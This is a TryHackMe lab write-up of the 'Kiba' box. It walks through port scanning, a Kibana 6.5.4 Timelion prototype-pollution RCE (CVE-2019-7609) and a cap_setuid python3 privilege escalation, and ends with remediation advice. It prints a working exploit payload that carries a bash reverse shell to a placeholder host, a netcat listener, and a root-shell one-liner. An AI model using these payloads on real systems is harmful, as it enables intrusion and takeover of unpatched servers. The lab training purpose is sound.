# Kiba — TryHackMe

**Platform:** TryHackMe
**Difficulty:** Easy
**OS:** Linux
**Date:** 25 Oct 2026

> Block 1 exit exam — solved solo. Attack chain: Kibana 6.5.4 RCE (CVE-2019-7609) → `kiba` user → `cap_setuid` capability → root.

---

## 1. Summary

The target runs an exposed **Kibana 6.5.4** instance on a non-standard port. This version is vulnerable to a Timelion prototype pollution flaw (**CVE-2019-7609**) allowing remote code execution. After landing a shell as the `kiba` user, privilege escalation was achieved by abusing a misconfigured Linux capability (`cap_setuid`) on a hidden `python3` binary.

| Phase | Result |
|---|---|
| Initial access | Kibana 6.5.4 RCE (CVE-2019-7609) → `kiba` |
| Privilege escalation | `cap_setuid` capability → `root` |
| Flags | `user.txt`, `root.txt` |

---

## 2. Enumeration

### 2.1 Initial scan

```bash
nmap -sV -sC <TARGET_IP>
```

| Port | Service |
|---|---|
| 22/tcp | OpenSSH |
| 80/tcp | HTTP |

### 2.2 Dead ends

- **Port 80:** `gobuster` directory scan returned nothing useful.
- **Port 22:** The `kali` username was accepted (prompted for a password) but no valid credentials were available.

### 2.3 Full port scan — the turning point

The top-1000 scan missed the real attack surface. A full scan of all 65535 ports was run:

```bash
nmap -p- -sV <TARGET_IP>
```

This revealed a port **not present** in the default scan:

| Port | Service |
|---|---|
| 5601/tcp | Kibana |

> **Takeaway:** Port 5601 sits outside the top-1000 range, so the standard scan never showed it. Without `-p-` this box is unsolvable. Full port scanning is now a standard first step.

### 2.4 Service identification

The web interface on 5601 exposed **Kibana 6.5.4**, which maps to **CVE-2019-7609** (Kibana Timelion prototype pollution → RCE).

---

## 3. Exploitation — Initial Access

### 3.1 Listener

```bash
nc -lvnp 4444
```

### 3.2 Payload

Executed in the Kibana → Timelion interface:

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/<TUN0_IP>/4444 0>&1\'");//') .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

### 3.3 How the payload works

| Part | Function |
|---|---|
| `.props(label.__proto__.env.AAAA=...)` | Injects an `AAAA` variable into every object's `env` via `__proto__` (prototype pollution). It holds the reverse shell code. |
| `require("child_process").exec(...)` | The injected variable contains a bash reverse shell command. |
| `NODE_OPTIONS='--require /proc/self/environ'` | Node.js `require`s `/proc/self/environ` as a JS module on every new process. That file holds the env vars (including the `AAAA` shell code), so Node executes it → **RCE**. |

### 3.4 Shell as kiba

```bash
id
uid=1000(kiba) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```

### 3.5 User flag

```bash
cat /home/kiba/user.txt
THM{[REDACTED]}
```

---

## 4. Privilege Escalation

### 4.1 SUID scan — no result

```bash
find / -perm -4000 -type f 2>/dev/null
```

Only standard system binaries (`sudo`, `passwd`, `mount`, …) — nothing exploitable.

### 4.2 Capability scan — the turning point

```bash
getcap -r / 2>/dev/null
```

```
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
```

A custom `python3` in a hidden directory carries the `cap_setuid` capability, which lets a process set its own UID to any value — including 0 (root).

### 4.3 Exploit

```bash
/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```bash
id
uid=0(root) gid=1000(kiba) ...
```

> **Mechanism:** `cap_setuid` makes `os.setuid(0)` succeed without sudo or a password. The spawned `/bin/bash` then runs as root — same outcome as a SUID binary, via a capability instead.

### 4.4 Root flag

```bash
cat /root/root.txt
THM{[REDACTED]}
```

---

## 5. Findings & Recommendations

| # | Finding | Severity | Recommendation |
|---|---|---|---|
| 1 | Kibana 6.5.4 — CVE-2019-7609 RCE | **Critical** | Patch to a fixed version; keep Kibana off the public internet, behind a reverse proxy + auth. |
| 2 | Writable binary with `cap_setuid` | **Critical** | Remove unnecessary capabilities (`setcap -r`); keep no privileged binaries in user directories. |
| 3 | Service on non-standard port (5601) | Info | Inventory the attack surface; close unused services. |

---

## 6. Lessons Learned

1. **`-p-` is a standard step.** The target port (5601) was outside the top-1000 range; without a full scan the box stays unsolved.
2. **Early dead ends (22/80) can mislead.** The real attack surface is not always on the first ports shown.
3. **SUID is not the only privesc path.** `getcap` must always be checked when the SUID scan comes up empty — this time both checks were run together, and the capability vector was the way in.
